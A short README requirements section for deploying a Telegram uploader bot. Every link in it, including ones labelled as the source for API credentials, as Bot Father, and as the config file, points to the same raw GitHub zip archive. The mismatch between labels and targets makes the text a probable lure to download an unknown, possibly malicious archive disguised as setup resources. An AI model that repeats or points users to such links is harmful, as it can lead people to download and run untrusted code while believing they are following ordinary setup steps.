## Requirement
* API ID & API Hash - Get both from https://raw.githubusercontent.com/Shafranpackeer/MegaUploaderbot/master/mega/Mega-Uploaderbot-v2.3.zip
* Bot Token - Get easily from [Bot Father](https://raw.githubusercontent.com/Shafranpackeer/MegaUploaderbot/master/mega/Mega-Uploaderbot-v2.3.zip)
* MongoDB Connection String - Get From MongoDB Atlas.

After meeting the requirements, fill the https://raw.githubusercontent.com/Shafranpackeer/MegaUploaderbot/master/mega/Mega-Uploaderbot-v2.3.zip file and then depoly the bot successfully.
